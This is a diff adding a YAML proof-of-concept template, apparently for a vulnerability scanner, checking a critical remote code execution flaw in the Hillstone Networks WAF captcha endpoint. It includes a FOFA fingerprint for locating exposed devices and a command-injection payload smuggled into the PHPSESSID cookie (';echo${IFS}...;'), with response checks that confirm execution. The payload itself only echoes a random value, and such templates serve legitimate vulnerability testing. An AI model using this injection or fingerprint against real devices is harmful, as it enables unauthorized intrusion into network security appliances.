@@ -1,0 +1,21 @@
+id: poc-yaml-hillstonenet-waf-captcha-rce
+info:
+  name: 山石网科 WAF captcha 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 山石网科 WAF
+  fofa: icon_hash="-839455805"
+variables:
+  payload: md5(random_int(1000,10000))
+requests:
+- method: GET
+  path: /rest/captcha
+  expression: status_code == 200 && contains(body,"PNG")
+- method: GET
+  path: /rest/captcha
+  headers:
+    Cookie: PHPSESSID=aaaaaaaaaa%3becho${IFS}{{.payload}}%3bd
+  expression: status_code == 200 && !contains(body,"PNG") && contains(body,payload)
+    && contains(content_type,"image/png")
+transport: http
